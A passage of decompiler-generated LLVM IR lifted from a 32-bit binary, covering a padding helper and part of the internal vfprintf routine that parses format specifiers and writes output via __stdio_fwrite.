  store i32 %arg2, i32* @edi, align 4
  store i32 %arg3, i32* @ebx, align 4
  %v3_80526c9 = trunc i32 %arg2 to i8
  %v5_80526c9 = icmp slt i8 %v3_80526c9, 0
  %v1_80526cb = icmp eq i1 %v5_80526c9, false
  %tmp21 = ptrtoint i8* %arg4 to i32
  br i1 %v1_80526cb, label %dec_label_pc_80526fc, label %dec_label_pc_80526cd

dec_label_pc_80526cd:                             ; preds = %entry
  %v3_80526d4 = call i32 @strlen(i8* %arg4)
  %v0_80526dc = load i32, i32* @ebx, align 4
  %v2_80526dc = sub i32 %v0_80526dc, %v3_80526d4
  store i32 %v2_80526dc, i32* @ebx, align 4
  store i32 %v3_80526d4, i32* @esi, align 4
  %tmp23 = icmp slt i32 %v2_80526dc, 1
  br i1 %tmp23, label %dec_label_pc_80526fa, label %dec_label_pc_80526e4

dec_label_pc_80526e4:                             ; preds = %dec_label_pc_80526cd
  store i32 %arg1, i32* @eax, align 4
  %v0_80526e8 = load i32, i32* @edi, align 4
  %v1_80526e8 = urem i32 %v0_80526e8, 128
  store i32 %v1_80526e8, i32* @edi, align 4
  store i32 %v2_80526dc, i32* @ecx, align 4
  store i32 %v1_80526e8, i32* @edx, align 4
  %v0_80526ef = call i32 @_charpad()
  %v12_80526f4 = icmp eq i32 %v0_80526ef, %v2_80526dc
  store i32 %v0_80526ef, i32* @ebp, align 4
  %v1_80526f8 = icmp eq i1 %v12_80526f4, false
  br i1 %v1_80526f8, label %dec_label_pc_8052716, label %dec_label_pc_80526e4.dec_label_pc_80526fa_crit_edge

dec_label_pc_80526e4.dec_label_pc_80526fa_crit_edge: ; preds = %dec_label_pc_80526e4
  %v0_80526fa.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80526fa

dec_label_pc_80526fa:                             ; preds = %dec_label_pc_80526e4.dec_label_pc_80526fa_crit_edge, %dec_label_pc_80526cd
  %v0_80526fa = phi i32 [ %v0_80526fa.pre, %dec_label_pc_80526e4.dec_label_pc_80526fa_crit_edge ], [ %v3_80526d4, %dec_label_pc_80526cd ]
  store i32 %v0_80526fa, i32* @ebx, align 4
  br label %dec_label_pc_80526fc

dec_label_pc_80526fc:                             ; preds = %entry, %dec_label_pc_80526fa
  %v0_8052707 = phi i32 [ %arg3, %entry ], [ %v0_80526fa, %dec_label_pc_80526fa ]
  %tmp24 = icmp slt i32 %v0_8052707, 1
  br i1 %tmp24, label %dec_label_pc_8052714, label %dec_label_pc_8052702

dec_label_pc_8052702:                             ; preds = %dec_label_pc_80526fc
  %v0_8052702 = load i32, i32* @ecx, align 4
  %v5_805270c = call i32 @__stdio_fwrite(i32 %tmp21, i32 %v0_8052707, i32 %arg1, i32 %v0_8052702)
  br label %dec_label_pc_8052714

dec_label_pc_8052714:                             ; preds = %dec_label_pc_80526fc, %dec_label_pc_8052702
  %v1_8052714 = phi i32 [ 0, %dec_label_pc_80526fc ], [ %v5_805270c, %dec_label_pc_8052702 ]
  %v0_8052714 = load i32, i32* @ebp, align 4
  %v2_8052714 = add i32 %v0_8052714, %v1_8052714
  br label %dec_label_pc_8052716

dec_label_pc_8052716:                             ; preds = %dec_label_pc_80526e4, %dec_label_pc_8052714
  %v0_8052719 = phi i32 [ %v0_80526ef, %dec_label_pc_80526e4 ], [ %v2_8052714, %dec_label_pc_8052714 ]
  ret i32 %v0_8052719

; uselistorder directives
  uselistorder i32 %v0_8052707, { 1, 0 }
  uselistorder i32 %v0_80526ef, { 1, 2, 0 }
  uselistorder i32 %v1_80526e8, { 1, 0 }
  uselistorder i32 %v2_80526dc, { 0, 2, 1, 3 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_8052716, { 1, 0 }
  uselistorder label %dec_label_pc_8052714, { 1, 0 }
  uselistorder label %dec_label_pc_80526fc, { 1, 0 }
}

define i32 @_vfprintf_internal(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %sf.global-to-local = alloca i1, align 1
  %st0.global-to-local = alloca x86_fp80, align 4
  %stack_var_-364 = alloca i32, align 4
  %stack_var_-348 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8052723 = load i32, i32* @ebx, align 4
  store i32 %v0_8052723, i32* %stack_var_-16, align 4
  %v4_8052723 = ptrtoint i32* %stack_var_-16 to i32
  %v1_8052724 = add i32 %v4_8052723, -356
  %v10_8052724 = icmp slt i32 %v1_8052724, 0
  store i1 %v10_8052724, i1* %sf.global-to-local, align 1
  %v4_805272a = ptrtoint i8* %arg2 to i32
  store i32 %v4_805272a, i32* @ebx, align 4
  %v2_8052732 = ptrtoint i32* %stack_var_-348 to i32
  store i32 %v2_8052732, i32* @esi, align 4
  %v5_8052737 = call i32 @_ppfs_init(i32* nonnull %stack_var_-348, i32 %v4_805272a)
  store i32 %v5_8052737, i32* %eax.global-to-local, align 4
  %v2_805273f = icmp slt i32 %v5_8052737, 0
  store i1 %v2_805273f, i1* %sf.global-to-local, align 1
  %v1_8052741 = icmp eq i1 %v2_805273f, false
  br i1 %v1_8052741, label %dec_label_pc_8052781, label %dec_label_pc_8052743

dec_label_pc_8052743:                             ; preds = %entry
  %v12_805273c = ptrtoint i32* %stack_var_-364 to i32
  %v3_8052743 = load i32, i32* %stack_var_-348, align 4
  store i32 %v3_8052743, i32* @ebx, align 4
  %v1_8052747 = add i32 %v12_805273c, -12
  %v10_8052747 = icmp slt i32 %v1_8052747, 0
  store i1 %v10_8052747, i1* %sf.global-to-local, align 1
  %v5_805274a = inttoptr i32 %v3_8052743 to i8*
  %v3_805274b = call i32 @strlen(i8* %v5_805274a)
  store i32 %v3_805274b, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %stack_var_-364, align 4
  %v1_805275a = icmp eq i32 %v3_805274b, 0
  %v2_805275a = icmp slt i32 %v3_805274b, 0
  store i1 %v2_805275a, i1* %sf.global-to-local, align 1
  br i1 %v1_805275a, label %dec_label_pc_8052cca, label %dec_label_pc_8052762

dec_label_pc_8052762:                             ; preds = %dec_label_pc_8052743
  %v0_8052762 = load i32, i32* @edx, align 4
  %v0_805276b = load i32, i32* @ebx, align 4
  %v6_805276c = call i32 @__stdio_fwrite(i32 %v0_805276b, i32 %v3_805274b, i32 %arg1, i32 %v0_8052762)
  store i32 %v6_805276c, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %stack_var_-364, align 4
  %v0_8052779 = load i32, i32* @esp, align 4
  %v1_8052779 = add i32 %v0_8052779, 16
  %v7_8052779 = icmp slt i32 %v1_8052779, 0
  store i1 %v7_8052779, i1* %sf.global-to-local, align 1
  br label %dec_label_pc_8052cca

dec_label_pc_8052781:                             ; preds = %entry
  %v6_805278b = call i32 @_ppfs_prepargs(i32 %v2_8052732, i32 %arg3, i32 %v5_8052737, i32 %v5_8052737)
  store i32 %v6_805278b, i32* %eax.global-to-local, align 4
  %v0_8052790 = load i32, i32* @ebx, align 4
  store i32 %v0_8052790, i32* %edx.global-to-local, align 4
  store i32 0, i32* %stack_var_-364, align 4
  %v0_805279a = load i32, i32* @esp, align 4
  %v1_805279a = add i32 %v0_805279a, 16
  %v7_805279a = icmp slt i32 %v1_805279a, 0
  store i1 %v7_805279a, i1* %sf.global-to-local, align 1
  br label %dec_label_pc_80527a0

dec_label_pc_805279f:                             ; preds = %dec_label_pc_80527a6
  %v1_805279f = add i32 %v0_80527ae, 1
  %v9_805279f = icmp slt i32 %v1_805279f, 0
  store i1 %v9_805279f, i1* %sf.global-to-local, align 1
  store i32 %v1_805279f, i32* @ebx, align 4
  br label %dec_label_pc_80527a0.backedge

dec_label_pc_80527a0.backedge:                    ; preds = %dec_label_pc_805279f, %dec_label_pc_8052cb0, %dec_label_pc_8052cbb
  %v1_80527aa22 = phi i32 [ %v1_80527b2, %dec_label_pc_805279f ], [ %v3_8052cb0, %dec_label_pc_8052cb0 ], [ %v1_80527de, %dec_label_pc_8052cbb ]
  %v0_80527a020 = phi i32 [ %v1_805279f, %dec_label_pc_805279f ], [ %v3_8052cb0, %dec_label_pc_8052cb0 ], [ %v1_8052cbb, %dec_label_pc_8052cbb ]
  %v4_80527a0.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80527a0

dec_label_pc_80527a0:                             ; preds = %dec_label_pc_80527a0.backedge, %dec_label_pc_8052781
  %v1_80527b2 = phi i32 [ %v1_80527aa22, %dec_label_pc_80527a0.backedge ], [ %v0_8052790, %dec_label_pc_8052781 ]
  %v0_80527ae = phi i32 [ %v0_80527a020, %dec_label_pc_80527a0.backedge ], [ %v0_8052790, %dec_label_pc_8052781 ]
  %v4_80527a0 = phi i32 [ %v4_80527a0.pre, %dec_label_pc_80527a0.backedge ], [ %v6_805278b, %dec_label_pc_8052781 ]
  %v1_80527a0 = inttoptr i32 %v0_80527ae to i8*
  %v2_80527a0 = load i8, i8* %v1_80527a0, align 1
  %v3_80527a0 = zext i8 %v2_80527a0 to i32
  %v5_80527a0 = and i32 %v4_80527a0, -256
  %v6_80527a0 = or i32 %v3_80527a0, %v5_80527a0
  store i32 %v6_80527a0, i32* %eax.global-to-local, align 4
  %v4_80527a2 = icmp eq i8 %v2_80527a0, 0
  %v5_80527a2 = icmp slt i8 %v2_80527a0, 0
  store i1 %v5_80527a2, i1* %sf.global-to-local, align 1
  br i1 %v4_80527a2, label %dec_label_pc_80527aa, label %dec_label_pc_80527a6

dec_label_pc_80527a6:                             ; preds = %dec_label_pc_80527a0
  %v2_80527a6 = add i8 %v2_80527a0, -37
  %v10_80527a6 = icmp eq i8 %v2_80527a6, 0
  %v11_80527a6 = icmp slt i8 %v2_80527a6, 0
  store i1 %v11_80527a6, i1* %sf.global-to-local, align 1
  %v1_80527a8 = icmp eq i1 %v10_80527a6, false
  br i1 %v1_80527a8, label %dec_label_pc_805279f, label %dec_label_pc_80527aa

dec_label_pc_80527aa:                             ; preds = %dec_label_pc_80527a6, %dec_label_pc_80527a0
  %v2_80527aa = sub i32 %v0_80527ae, %v1_80527b2
  %v12_80527aa = icmp eq i32 %v2_80527aa, 0
  %v13_80527aa = icmp slt i32 %v2_80527aa, 0
  store i1 %v13_80527aa, i1* %sf.global-to-local, align 1
  br i1 %v12_80527aa, label %dec_label_pc_80527d5, label %dec_label_pc_80527ae

dec_label_pc_80527ae:                             ; preds = %dec_label_pc_80527aa
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %v2_80527aa, i32* @esi, align 4
  store i1 %v13_80527aa, i1* %sf.global-to-local, align 1
  %tmp67 = icmp slt i32 %v2_80527aa, 1
  br i1 %tmp67, label %dec_label_pc_80527ca, label %dec_label_pc_80527b8

dec_label_pc_80527b8:                             ; preds = %dec_label_pc_80527ae
  %v0_80527b8 = load i32, i32* @ebp, align 4
  %v1_80527b8 = load i32, i32* @esp, align 4
  %v2_80527b8 = add i32 %v1_80527b8, -4
  %v3_80527b8 = inttoptr i32 %v2_80527b8 to i32*
  store i32 %v0_80527b8, i32* %v3_80527b8, align 4
  %v1_80527b9 = add i32 %v1_80527b8, 368
  %v2_80527b9 = inttoptr i32 %v1_80527b9 to i32*
  %v3_80527b9 = load i32, i32* %v2_80527b9, align 4
  %v5_80527b9 = add i32 %v1_80527b8, -8
  %v6_80527b9 = inttoptr i32 %v5_80527b9 to i32*
  store i32 %v3_80527b9, i32* %v6_80527b9, align 4
  %v0_80527c0 = load i32, i32* @esi, align 4
  %v2_80527c0 = add i32 %v1_80527b8, -12
  %v3_80527c0 = inttoptr i32 %v2_80527c0 to i32*
  store i32 %v0_80527c0, i32* %v3_80527c0, align 4
  %v0_80527c1 = load i32, i32* %edx.global-to-local, align 4
  %v2_80527c1 = add i32 %v1_80527b8, -16
  %v3_80527c1 = inttoptr i32 %v2_80527c1 to i32*
  store i32 %v0_80527c1, i32* %v3_80527c1, align 4
  %v0_80527c2 = load i32, i32* %stack_var_-364, align 4
  %v4_80527c2 = call i32 @__stdio_fwrite(i32 %v0_80527c2, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_80527c2, i32* %eax.global-to-local, align 4
  %v0_80527c7 = load i32, i32* @esp, align 4
  %v1_80527c7 = add i32 %v0_80527c7, 16
  %v7_80527c7 = icmp slt i32 %v1_80527c7, 0
  store i1 %v7_80527c7, i1* %sf.global-to-local, align 1
  %v1_80527ca.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80527ca

dec_label_pc_80527ca:                             ; preds = %dec_label_pc_80527ae, %dec_label_pc_80527b8
  %v3_80527d2 = phi i32 [ %v2_80527aa, %dec_label_pc_80527ae ], [ %v1_80527ca.pre, %dec_label_pc_80527b8 ]
  %v0_80527ca = phi i32 [ 0, %dec_label_pc_80527ae ], [ %v4_80527c2, %dec_label_pc_80527b8 ]
  %v2_80527ca = sub i32 %v0_80527ca, %v3_80527d2
  %v12_80527ca = icmp eq i32 %v2_80527ca, 0
  %v13_80527ca = icmp slt i32 %v2_80527ca, 0
  store i1 %v13_80527ca, i1* %sf.global-to-local, align 1
  %v1_80527cc = icmp eq i1 %v12_80527ca, false
  %v0_8052cc3.pre.pre = load i32, i32* @esp, align 4
  br i1 %v1_80527cc, label %dec_label_pc_8052cc3, label %dec_label_pc_80527d2

dec_label_pc_80527d2:                             ; preds = %dec_label_pc_80527ca
  %v1_80527d2 = inttoptr i32 %v0_8052cc3.pre.pre to i32*
  %v2_80527d2 = load i32, i32* %v1_80527d2, align 4
  %v4_80527d2 = add i32 %v2_80527d2, %v3_80527d2
  %v15_80527d2 = icmp slt i32 %v4_80527d2, 0
  store i1 %v15_80527d2, i1* %sf.global-to-local, align 1
  store i32 %v4_80527d2, i32* %v1_80527d2, align 4
  %v0_80527d5.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80527d5

dec_label_pc_80527d5:                             ; preds = %dec_label_pc_80527aa, %dec_label_pc_80527d2
  %v0_8052cbb = phi i32 [ %v0_80527ae, %dec_label_pc_80527aa ], [ %v0_80527d5.pre, %dec_label_pc_80527d2 ]
  %v1_80527d5 = inttoptr i32 %v0_8052cbb to i8*
  %v2_80527d5 = load i8, i8* %v1_80527d5, align 1
  %v3_80527d5 = icmp eq i8 %v2_80527d5, 0
  %v4_80527d5 = icmp slt i8 %v2_80527d5, 0
  store i1 %v4_80527d5, i1* %sf.global-to-local, align 1
  br i1 %v3_80527d5, label %dec_label_pc_8052cca, label %dec_label_pc_80527de

dec_label_pc_80527de:                             ; preds = %dec_label_pc_80527d5
  %v1_80527de = add i32 %v0_8052cbb, 1
  %v2_80527de = inttoptr i32 %v1_80527de to i8*
  %v3_80527de = load i8, i8* %v2_80527de, align 1
  %v4_80527de = add i8 %v3_80527de, -37
  %v12_80527de = icmp eq i8 %v4_80527de, 0
  %v13_80527de = icmp slt i8 %v4_80527de, 0
  store i1 %v13_80527de, i1* %sf.global-to-local, align 1
  store i32 %v1_80527de, i32* %edx.global-to-local, align 4
  br i1 %v12_80527de, label %dec_label_pc_8052cbb, label %dec_label_pc_80527eb

dec_label_pc_80527eb:                             ; preds = %dec_label_pc_80527de
  %v1_80527eb = load i32, i32* @esp, align 4
  %v2_80527eb = add i32 %v1_80527eb, 16
  %v3_80527eb = inttoptr i32 %v2_80527eb to i32*
  store i32 %v1_80527de, i32* %v3_80527eb, align 4
  %v0_80527ef = load i32, i32* @esp, align 4
  %v1_80527ef = add i32 %v0_80527ef, 340
  %v2_80527ef = inttoptr i32 %v1_80527ef to i32*
  store i32 0, i32* %v2_80527ef, align 4
  %v0_80527fa = load i32, i32* @esp, align 4
  %v1_80527fa = add i32 %v0_80527fa, -12
  %v10_80527fa = icmp slt i32 %v1_80527fa, 0
  store i1 %v10_80527fa, i1* %sf.global-to-local, align 1
  %v1_80527fd = add i32 %v0_80527fa, 16
  store i32 %v1_80527fd, i32* @ebx, align 4
  %v2_8052801 = add i32 %v0_80527fa, -16
  %v3_8052801 = inttoptr i32 %v2_8052801 to i32*
  store i32 %v1_80527fd, i32* %v3_8052801, align 4
  %v0_8052802 = load i32, i32* %stack_var_-364, align 4
  %v1_8052802 = inttoptr i32 %v0_8052802 to i32*
  %v2_8052802 = call i32 @_ppfs_parsespec(i32* %v1_8052802)
  store i32 %v2_8052802, i32* %eax.global-to-local, align 4
  %v0_8052807 = load i32, i32* @ebx, align 4
  %v1_8052807 = load i32, i32* @esp, align 4
  %v2_8052807 = inttoptr i32 %v1_8052807 to i32*
  store i32 %v0_8052807, i32* %v2_8052807, align 4
  %v0_805280a = load i32, i32* %stack_var_-364, align 4
  %v1_805280a = call i32 @_ppfs_setargs(i32 %v0_805280a)
  store i32 %v1_805280a, i32* %eax.global-to-local, align 4
  %v0_805280f = load i32, i32* @esp, align 4
  %v1_805280f = add i32 %v0_805280f, 70
  %v2_805280f = inttoptr i32 %v1_805280f to i8*
  %v3_805280f = load i8, i8* %v2_805280f, align 1
  %v4_805280f = zext i8 %v3_805280f to i32
  store i32 %v4_805280f, i32* @edi, align 4
  %v1_8052814 = add i32 %v0_805280f, 16
  %v1_8052817 = add i32 %v0_805280f, 56
  %v2_8052817 = inttoptr i32 %v1_8052817 to i32*
  %v3_8052817 = load i32, i32* %v2_8052817, align 4
  %v5_8052817 = icmp slt i32 %v3_8052817, 0
  store i1 %v5_8052817, i1* %sf.global-to-local, align 1
  %v1_805281c = add i32 %v0_805280f, 112
  store i32 %v1_805281c, i32* %edx.global-to-local, align 4
  %tmp68 = icmp slt i32 %v3_8052817, 1
  br i1 %tmp68, label %dec_label_pc_8052829, label %dec_label_pc_8052822

dec_label_pc_8052822:                             ; preds = %dec_label_pc_80527eb
  %v2_8052822 = zext i8 %v3_805280f to i32
  %v3_8052822 = mul nuw nsw i32 %v2_8052822, 12
  store i32 %v3_8052822, i32* %eax.global-to-local, align 4
  %v2_8052825 = add i32 %v0_805280f, 100
  %v3_8052825 = add i32 %v2_8052825, %v3_8052822
  store i32 %v3_8052825, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8052829

dec_label_pc_8052829:                             ; preds = %dec_label_pc_80527eb, %dec_label_pc_8052822
  %v0_805283129 = phi i32 [ %v1_805281c, %dec_label_pc_80527eb ], [ %v3_8052825, %dec_label_pc_8052822 ]
  %v1_8052829 = add i32 %v0_805280f, 60
  %v2_8052829 = inttoptr i32 %v1_8052829 to i32*
  %v3_8052829 = load i32, i32* %v2_8052829, align 4
  store i32 %v3_8052829, i32* %ecx.global-to-local, align 4
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* %eax.global-to-local, align 4
  %v2_805283c74 = sub i32 0, %v3_8052829
  %v10_805283c77 = and i32 %v3_8052829, %v2_805283c74
  %v11_805283c78 = icmp slt i32 %v10_805283c77, 0
  %v13_805283c79 = icmp slt i32 %v2_805283c74, 0
  %v2_805283e80 = icmp eq i1 %v13_805283c79, %v11_805283c78
  br i1 %v2_805283e80, label %dec_label_pc_8052840, label %dec_label_pc_8052831

dec_label_pc_8052831:                             ; preds = %dec_label_pc_8052829, %dec_label_pc_8052831
  %v0_805284084 = phi i32 [ %v0_8052840, %dec_label_pc_8052831 ], [ %v1_8052814, %dec_label_pc_8052829 ]
  %v2_805283183 = phi i32 [ %v1_805283b, %dec_label_pc_8052831 ], [ 0, %dec_label_pc_8052829 ]
  %v0_805283182 = phi i32 [ %v1_8052838, %dec_label_pc_8052831 ], [ %v0_805283129, %dec_label_pc_8052829 ]
  %v3_8052831 = mul i32 %v2_805283183, 4
  %v4_8052831 = add i32 %v3_8052831, 344
  %v5_8052831 = add i32 %v4_8052831, %v0_805284084
  %v6_8052831 = inttoptr i32 %v5_8052831 to i32*
  store i32 %v0_805283182, i32* %v6_8052831, align 4
  %v0_8052838 = load i32, i32* %edx.global-to-local, align 4
  %v1_8052838 = add i32 %v0_8052838, 12
  store i32 %v1_8052838, i32* %edx.global-to-local, align 4
  %v0_805283b = load i32, i32* %eax.global-to-local, align 4
  %v1_805283b = add i32 %v0_805283b, 1
  %v1_805283c.pre = load i32, i32* %ecx.global-to-local, align 4
  store i32 %v1_805283b, i32* %eax.global-to-local, align 4
  %v2_805283c = sub i32 %v1_805283b, %v1_805283c.pre
  %v8_805283c = xor i32 %v1_805283b, %v1_805283c.pre
  %v9_805283c = xor i32 %v2_805283c, %v1_805283b
  %v10_805283c = and i32 %v9_805283c, %v8_805283c
  %v11_805283c = icmp slt i32 %v10_805283c, 0
  %v13_805283c = icmp slt i32 %v2_805283c, 0
  %v2_805283e = icmp eq i1 %v13_805283c, %v11_805283c
  %v0_8052840 = load i32, i32* @esp, align 4
  br i1 %v2_805283e, label %dec_label_pc_8052840, label %dec_label_pc_8052831

dec_label_pc_8052840:                             ; preds = %dec_label_pc_8052831, %dec_label_pc_8052829
  %v0_8052840.lcssa = phi i32 [ %v1_8052814, %dec_label_pc_8052829 ], [ %v0_8052840, %dec_label_pc_8052831 ]
  %v1_8052840 = add i32 %v0_8052840.lcssa, 48
  %v2_8052840 = inttoptr i32 %v1_8052840 to i32*
  %v3_8052840 = load i32, i32* %v2_8052840, align 4
  store i32 %v3_8052840, i32* %ecx.global-to-local, align 4
  %v1_8052844 = icmp eq i32 %v3_8052840, 0
  %v2_8052844 = icmp slt i32 %v3_8052840, 0
  store i1 %v2_8052844, i1* %sf.global-to-local, align 1
  %v1_8052846 = icmp eq i1 %v1_8052844, false
  br i1 %v1_8052846, label %dec_label_pc_805286e, label %dec_label_pc_8052848

dec_label_pc_8052848:                             ; preds = %dec_label_pc_8052840
  %v1_8052848 = inttoptr i32 %v0_8052840.lcssa to i32*
  %v2_8052848 = load i32, i32* %v1_8052848, align 4
  store i32 %v2_8052848, i32* %eax.global-to-local, align 4
  %v1_805284b = ashr i32 %v2_8052848, 31
  store i32 %v1_805284b, i32* %edx.global-to-local, align 4
  %v2_805284c = add i32 %v0_8052840.lcssa, -4
  %v3_805284c = inttoptr i32 %v2_805284c to i32*
  store i32 %v1_805284b, i32* %v3_805284c, align 4
  %v0_805284d = load i32, i32* %eax.global-to-local, align 4
  %v2_805284d = add i32 %v0_8052840.lcssa, -8
  %v3_805284d = inttoptr i32 %v2_805284d to i32*
  store i32 %v0_805284d, i32* %v3_805284d, align 4
  %v1_805284e = add i32 %v0_8052840.lcssa, 32
  %v2_805284e = inttoptr i32 %v1_805284e to i32*
  %v3_805284e = load i32, i32* %v2_805284e, align 4
  %v1_8052852 = and i32 %v3_805284e, 3840
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 %v1_8052852, i32* %eax.global-to-local, align 4
  %v2_8052857 = add i32 %v0_8052840.lcssa, -12
  %v3_8052857 = inttoptr i32 %v2_8052857 to i32*
  store i32 %v1_8052852, i32* %v3_8052857, align 4
  %v1_8052858 = add i32 %v0_8052840.lcssa, 344
  %v2_8052858 = inttoptr i32 %v1_8052858 to i32*
  %v3_8052858 = load i32, i32* %v2_8052858, align 4
  store i32 %v3_8052858, i32* %eax.global-to-local, align 4
  %v1_805285f = inttoptr i32 %v3_8052858 to i32*
  %v2_805285f = load i32, i32* %v1_805285f, align 4
  %v4_805285f = add i32 %v0_8052840.lcssa, -16
  %v5_805285f = inttoptr i32 %v4_805285f to i32*
  store i32 %v2_805285f, i32* %v5_805285f, align 4
  %v0_8052861 = call i32 @_store_inttype()
  store i32 %v0_8052861, i32* %eax.global-to-local, align 4
  %v0_8052866 = load i32, i32* @esp, align 4
  %v1_8052866 = add i32 %v0_8052866, 16
  %v7_8052866 = icmp slt i32 %v1_8052866, 0
  store i1 %v7_8052866, i1* %sf.global-to-local, align 1
  br label %dec_label_pc_8052cb0

dec_label_pc_805286e:                             ; preds = %dec_label_pc_8052840
  %v1_805286e = add i32 %v3_8052840, -7
  %v5_805286e = icmp ult i32 %v3_8052840, 7
  %v9_805286e = icmp eq i32 %v1_805286e, 0
  %v10_805286e = icmp slt i32 %v1_805286e, 0
  store i1 %v10_805286e, i1* %sf.global-to-local, align 1
  %v2_8052871 = or i1 %v5_805286e, %v9_805286e
  br i1 %v2_8052871, label %dec_label_pc_8052877, label %dec_label_pc_80529db

dec_label_pc_8052877:                             ; preds = %dec_label_pc_805286e
  %v1_8052877 = add i32 %v3_8052840, 134601520
  %v2_8052877 = inttoptr i32 %v1_8052877 to i8*
  %v3_8052877 = load i8, i8* %v2_8052877, align 1
  %v4_8052877 = sext i8 %v3_8052877 to i32
  store i32 %v4_8052877, i32* @esi, align 4
  store i32 87, i32* @ebx, align 4
  %v9_8052883 = icmp eq i8 %v3_8052877, 10
  %v10_8052883 = icmp slt i8 %v3_8052877, 10
  store i1 %v10_8052883, i1* %sf.global-to-local, align 1
  %v1_8052886 = icmp eq i1 %v9_8052883, false
  br i1 %v1_8052886, label %dec_label_pc_80528a6, label %dec_label_pc_8052888

dec_label_pc_8052888:                             ; preds = %dec_label_pc_8052877
  %v1_8052888 = add i32 %v0_8052840.lcssa, 32
  %v2_8052888 = inttoptr i32 %v1_8052888 to i32*
  %v3_8052888 = load i32, i32* %v2_8052888, align 4
  store i32 %v3_8052888, i32* %eax.global-to-local, align 4
  %v1_805288e = udiv i32 %v3_8052888, 32
  %tmp69 = urem i32 %v1_805288e, 2
  %tmp70 = sub nsw i32 45, %tmp69
  %v2_805289e = or i32 %tmp70, 128
  store i32 %v2_805289e, i32* %edx.global-to-local, align 4
  %v2_80528a1 = and i32 %v3_8052888, 64
  %v3_80528a1 = icmp eq i32 %v2_80528a1, 0
  store i1 false, i1* %sf.global-to-local, align 1
  %v1_80528a3 = icmp eq i1 %v3_80528a1, false
  %v4_80528a3 = select i1 %v1_80528a3, i32 %v2_805289e, i32 %tmp70
  store i32 %v4_80528a3, i32* @ebx, align 4
  br label %dec_label_pc_80528a6

dec_label_pc_80528a6:                             ; preds = %dec_label_pc_8052877, %dec_label_pc_8052888
  %v1_80528a6 = add i32 %v3_8052840, -5
  %v5_80528a6 = icmp ult i32 %v3_8052840, 5
  %v9_80528a6 = icmp eq i32 %v1_80528a6, 0
  %v10_80528a6 = icmp slt i32 %v1_80528a6, 0
  store i1 %v10_80528a6, i1* %sf.global-to-local, align 1
  %v2_80528a9 = or i1 %v5_80528a6, %v9_80528a6
  br i1 %v2_80528a9, label %dec_label_pc_80528ab, label %dec_label_pc_80528c3

dec_label_pc_80528ab:                             ; preds = %dec_label_pc_80528a6
  %v1_80528ab = add i32 %v3_8052840, -3
  %v9_80528ab = icmp eq i32 %v1_80528ab, 0
  %v10_80528ab = icmp slt i32 %v1_80528ab, 0
  store i1 %v10_80528ab, i1* %sf.global-to-local, align 1
  %v1_80528ae = icmp eq i1 %v9_80528ab, false
  br i1 %v1_80528ae, label %dec_label_pc_80528b7, label %dec_label_pc_80528b0

dec_label_pc_80528b0:                             ; preds = %dec_label_pc_80528ab
  store i32 55, i32* @ebx, align 4
  br label %dec_label_pc_80528c5

dec_label_pc_80528b7:                             ; preds = %dec_label_pc_80528ab
  %v1_80528b7 = add i32 %v3_8052840, -1
  %v9_80528b7 = icmp eq i32 %v1_80528b7, 0
  %v10_80528b7 = icmp slt i32 %v1_80528b7, 0
  store i1 %v10_80528b7, i1* %sf.global-to-local, align 1
  br i1 %v9_80528b7, label %dec_label_pc_80528ca, label %dec_label_pc_80528c5

dec_label_pc_80528c3:                             ; preds = %dec_label_pc_80528a6
  %v1_80528c3 = sub nsw i32 0, %v4_8052877
  %v7_80528c3 = icmp sgt i8 %v3_8052877, 0
  store i1 %v7_80528c3, i1* %sf.global-to-local, align 1
  store i32 %v1_80528c3, i32* @esi, align 4
  br label %dec_label_pc_80528c5

dec_label_pc_80528c5:                             ; preds = %dec_label_pc_80528b7, %dec_label_pc_80528b0, %dec_label_pc_80528c3
  br label %dec_label_pc_80528ca

dec_label_pc_80528ca:                             ; preds = %dec_label_pc_80528b7, %dec_label_pc_80528c5
  %storemerge = phi i32 [ 11, %dec_label_pc_80528c5 ], [ 6, %dec_label_pc_80528b7 ]
  store i32 %storemerge, i32* @ebp, align 4
  %v1_80528ca = add i32 %v0_8052840.lcssa, 20
  %v2_80528ca = inttoptr i32 %v1_80528ca to i32*
  %v3_80528ca = load i32, i32* %v2_80528ca, align 4
  %v5_80528ca = icmp slt i32 %v3_80528ca, 0
  store i1 %v5_80528ca, i1* %sf.global-to-local, align 1
  %v1_80528cf = add i32 %v0_8052840.lcssa, 7
  %v2_80528cf = inttoptr i32 %v1_80528cf to i8*
  store i8 32, i8* %v2_80528cf, align 1
  %v0_80528d4 = load i1, i1* %sf.global-to-local, align 1
  %v1_80528d4 = icmp eq i1 %v0_80528d4, false
  br i1 %v1_80528d4, label %dec_label_pc_80528de, label %dec_label_pc_80528d6

dec_label_pc_80528d6:                             ; preds = %dec_label_pc_80528ca
  %v0_80528d6 = load i32, i32* @esp, align 4
  %v1_80528d6 = add i32 %v0_80528d6, 36
  %v2_80528d6 = inttoptr i32 %v1_80528d6 to i8*
  %v3_80528d6 = load i8, i8* %v2_80528d6, align 1
  %v4_80528d6 = zext i8 %v3_80528d6 to i32
  %v5_80528d6 = load i32, i32* %edx.global-to-local, align 4
  %v6_80528d6 = and i32 %v5_80528d6, -256
  %v7_80528d6 = or i32 %v6_80528d6, %v4_80528d6
  store i32 %v7_80528d6, i32* %edx.global-to-local, align 4
  %v3_80528da = add i32 %v0_80528d6, 7
  %v4_80528da = inttoptr i32 %v3_80528da to i8*
  store i8 %v3_80528d6, i8* %v4_80528da, align 1
  br label %dec_label_pc_80528de

dec_label_pc_80528de:                             ; preds = %dec_label_pc_80528ca, %dec_label_pc_80528d6
  %v1_80528de = add i32 %v3_8052840, -1
  %v8_80528de = icmp eq i32 %v1_80528de, 0
